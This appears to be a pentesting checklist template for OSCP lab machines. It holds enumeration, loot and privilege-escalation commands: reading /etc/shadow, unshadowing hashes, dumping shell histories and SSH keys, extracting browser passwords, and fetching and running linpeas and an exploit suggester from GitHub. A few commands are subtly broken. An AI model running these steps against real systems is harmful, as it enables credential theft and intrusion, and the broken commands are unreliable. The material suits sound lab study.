<% tp.file.rename("0_SystemChecklist")%>

# Enumeration

```bash
mkdir /oscp/lab/x
```

```bash
i="$hip";sudo nmap --osscan-guess -T 5 -A -p- $i -oX - | xsltproc -o 0_overview.html - && firefox 0_overview.html && sudo nmap -T 5 -sUV --top-ports 100 $i -oN 0_udp_top100.txt
```

> Then, create services templates.

# Initial Foothold

##### Utilized software versions
```

```
`searchsploit` and Google Dorks
##### NSE scripts
```bash
ls /usr/share/nmap/scripts
```

> Also, use the service templates
# Loot

Hostname `hostname`
	
##### Users
```bash
cat /etc/passwd; cat /etc/shadow; w
```
	
`unshadow passwd shadow > unshadowed.txt` 
##### Network
```bash
ip a; /sbin/route; netstat -anp; sudo iptables -S
```
	
##### Interesting files
```bash
ls /home/*/.gpg/; ls /home/*/.ssh/; cat /home/*/.*_history; find / -name ".git" | cd | git config --list 2>/dev/null
```
	
##### Home folder
```bash
ls -al /home/*/; ls -al /root/; find / -user $(id -un) -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
```
	
##### Advanced
X-Server: `pidof X`  (Extract cookies/passwords from browser with `pasco index.dat`)
Mounted Volumes: `cat /etc/fstab; mount; /bin/lsblk`
Drivers: `lsmod`, `/sbin/modinfo [module]`
# PrivEsc
##### Find Working Dir for attack
```bash
find / -writable -type d 2>/dev/null
```
	

##### LinPEAS
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh; chmod +x linpeas.sh; ./linpeash.sh -a -r > linpeas.txt &
```
Read it with color-highlighting using `less -r linpeas.txt`

##### Things not covered by linpeas
```bash
grep "CRON" /var/log/syslog; dpkg -l
```
	

##### Kernel Exploits
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh | tee LEP.txt
```
	